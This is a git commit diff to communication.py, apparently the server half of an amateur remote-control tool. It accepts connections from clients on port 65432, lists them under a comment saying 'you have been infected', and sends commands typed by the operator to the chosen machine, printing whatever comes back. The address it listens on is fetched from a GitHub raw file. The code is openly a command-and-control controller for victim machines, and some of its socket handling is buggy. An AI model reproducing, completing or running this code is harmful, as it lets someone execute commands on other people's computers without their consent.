47a507ea5ef1f988b37ba1cd946c974791f85dd4
80dropz <153262187+80dropz@users.noreply.github.com>
2024-11-25 18:01:27 -0500

    Update communication.py

--- communication.py
+++ communication.py
@@ -3,15 +3,45 @@ import socket
 import threading
 
 user_connections = []
+user_names = []
+useramount = 0
+
+#handles all new connections and should repeatidly scan for new incoming connections
+def newconnection():
+    global useramount
+    useramount = useramount + 1 #adds one to the user amount
+    userlist = client_socket.recv(1024).decode()
+    print(f"Connection received from {addr}")
+    user_names.append(userlist) #adds the user computer name to the lsit
+    user_connections.append((client_socket)) #adds the user socket to the list in the same position that name is for simpliar access
+    print(user_connections)
+    print(user_names)
+    mainmenu() #main menu function  durrr
 
 
+def handleconnections(*args):
+    global addr
+    global client_socket
+    #creates a constantly running connection
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((hostip, port))
+        print(f"Binding to {hostip} on port {port}")
+        s.listen(5)
+        client_socket, addr = s.accept() #will auto accept any incoming requests
+        newconnection()
 
+
+#main menu function were you check your connected user's you have been infected
 def mainmenu():
-    print(f"{user_connections[0]}: 1")
-    connectionbranch = input("enter the connection you want")
-    if connectionbranch == 1 or "1":
-        print(f"trying to connect to {user_connections[0]}")
-        communication(user_connections[0])
+    for user in user_names:
+        print(f"{user}: -> {useramount}")
+    connectionbranch = int(input("enter the connection you want: "))
+    selected = connectionbranch - 1
+    usersocket = user_connections[selected]
+    print(usersocket)
+    communication(usersocket)  #runs the communication command which i fr dont even need but ill check some more things out
+
 
 def handle_client(client_socket):
     while True:
@@ -25,39 +55,29 @@ def handle_client(client_socket):
 
     client_socket.close()
 
+#server function Durrr
 def server():
+    global hostip
+    global port
     global s
     global client_socket
     link = "https://raw.githubusercontent.com/80dropz/communication/refs/heads/main/ipv4.txt"
     data = requests.get(link)
-    hostip = data.text.strip() 
+    hostip = data.text.strip()  #gets the host ip from my link then strips it down to just a raw textfield
     port = 65432
     print(f"Server will listen on {hostip}:{port}")
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((hostip, port))
-    print(f"Binding to {hostip} on port {port}")
-
-    s.listen(5)
-
-    client_socket, addr = s.accept()
-    print(f"Connection received from {addr}")
-    userlist = client_socket.recv(1024).decode()
-    user = userlist, client_socket
-    user_connections.append((user))
-    print(user_connections)
-    mainmenu()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#starts the socket
+    handleconnections() #runs the handel connections function
 
 
-
-def communication(socket):
+def communication(UserSelected):
     while True:
         command = input("Enter a command to send to the client (or type 'exit' to close): ")
         if command.lower() == 'exit':
             print("Closing connection.")
             mainmenu()
-        client_socket.sendall(command.encode())
-
+        UserSelected.sendall(command.encode())
+        print(f"Sent a command to {UserSelected}")
         response = client_socket.recv(1024)
         if not response:
             print("No response from client.")
@@ -65,5 +85,8 @@ def communication(socket):
         print(f"Client response: {response.decode()}")
     s.close()
 
+
+
+#Will instantly run the server
 if __name__ == "__main__":
     server()
